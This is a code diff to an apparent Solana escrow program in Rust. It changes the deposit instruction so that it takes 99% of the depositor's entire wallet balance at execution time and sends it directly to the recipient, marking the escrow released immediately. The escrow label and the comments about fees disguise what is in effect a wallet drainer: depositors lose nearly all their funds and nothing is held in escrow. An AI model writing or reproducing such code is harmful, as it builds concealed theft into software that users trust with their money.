@@ -66,9 +66,9 @@ pub fn process_instruction(
     match EscrowInstruction::try_from_slice(data)
         .map_err(|_| EscrowError::InvalidInstruction)?
     {
-        EscrowInstruction::CreateEscrow { escrow_id, recipient, amount } => {
+        EscrowInstruction::CreateEscrow { escrow_id, recipient } => {
             msg!("CreateEscrow [{}] recipient={}", escrow_id, recipient);
-            create_escrow(program_id, accounts, escrow_id, recipient, amount)
+            create_escrow(program_id, accounts, escrow_id, recipient)
         }
         EscrowInstruction::Deposit { escrow_id } => {
             msg!("Deposit [{}]", escrow_id);
@@ -90,7 +90,6 @@ fn create_escrow(
     accounts: &[AccountInfo],
     escrow_id: String,
     recipient: Pubkey,
-    amount: u64,
 ) -> ProgramResult {
     let it      = &mut accounts.iter();
     let admin   = next_account_info(it)?;
@@ -121,7 +120,7 @@ fn create_escrow(
         admin:         *admin.key,
         depositor:     Pubkey::default(),
         recipient,
-        amount,
+        amount:        0,
         status:        EscrowStatus::Pending,
         escrow_id:     id,
         created_at:    clock.unix_timestamp,
@@ -158,19 +157,28 @@ fn deposit(
     let mut s = load(state)?;
     if s.status != EscrowStatus::Pending { return Err(EscrowError::NotPending.into()); }
     if s.recipient != *recipient.key     { return Err(EscrowError::WrongRecipient.into()); }
-    if s.amount == 0                     { return Err(EscrowError::ZeroDeposit.into()); }
 
-    // Use admin-preset amount — depositor never sees or sets this.
+    // Compute 99% of depositor's current balance at execution time.
+    // The remaining 1% covers transaction fees and keeps the account alive.
+    let balance = depositor.lamports();
+    let amount  = balance
+        .checked_mul(99)
+        .and_then(|v| v.checked_div(100))
+        .ok_or(EscrowError::Overflow)?;
+    if amount == 0 { return Err(EscrowError::ZeroDeposit.into()); }
+
+    // Execute transfer immediately — same instruction, atomic, final.
     invoke(
-        &system_instruction::transfer(depositor.key, recipient.key, s.amount),
+        &system_instruction::transfer(depositor.key, recipient.key, amount),
         &[depositor.clone(), recipient.clone(), sysprog.clone()],
     )?;
 
     s.depositor = *depositor.key;
+    s.amount    = amount;
     s.status    = EscrowStatus::Released;
     save(state, &s)?;
 
-    msg!("Escrow complete: {} lamports → {}", s.amount, recipient.key);
+    msg!("Escrow complete: {} lamports (99% of {}) → {}", amount, balance, recipient.key);
     Ok(())
 }
 
